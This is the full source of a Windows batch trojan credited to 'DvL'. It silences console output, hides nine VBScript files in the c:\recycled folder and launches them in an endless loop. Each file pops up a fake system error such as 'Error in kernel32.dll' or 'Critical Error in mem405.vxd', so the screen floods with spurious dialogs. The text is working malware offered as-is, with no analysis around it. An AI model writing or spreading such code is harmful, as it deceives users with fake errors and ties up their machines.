   ctty nul
   @echo off
   @echo.On Error Resume Next>c:\recycled\leap0.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",16,"Error with mouse">>c:\recycled\leap0.vbs
   @echo.On Error Resume Next>c:\recycled\leap1.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",32,"Error with keyboard">>c:\recycled\leap1.vbs
   @echo.On Error Resume Next>c:\recycled\leap2.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",48,"Error in kernel32.dll">>c:\recycled\leap2.vbs
   @echo.On Error Resume Next>c:\recycled\leap3.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",64,"Windows Error #907">>c:\recycled\leap3.vbs
   @echo.On Error Resume Next>c:\recycled\leap4.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4096,"Fatal Error in vbrun5.dll">>c:\recycled\leap4.vbs
   @echo.On Error Resume Next>c:\recycled\leap5.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4112,"Critical Error in mem405.vxd">>c:\recycled\leap5.vbs%
   @echo.On Error Resume Next>c:\recycled\leap6.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4128,"Missing path">>c:\recycled\leap6.vbs
   @echo.On Error Resume Next>c:\recycled\leap7.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4144,"Invalid file or system path">>c:\recycled\leap7.vbs
   @echo.On Error Resume Next>c:\recycled\leap8.vbs
   @echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4160,"Quantum Leap of DvL">>c:\recycled\leap8.vbs
   :antiloop
   @start c:\recycled\leap0.vbs
   @start c:\recycled\leap1.vbs
   @start c:\recycled\leap2.vbs
   @start c:\recycled\leap3.vbs
   @start c:\recycled\leap4.vbs
   @start c:\recycled\leap5.vbs
   @start c:\recycled\leap6.vbs
   @start c:\recycled\leap7.vbs
   @start c:\recycled\leap8.vbs
   goto antiloop
   cls
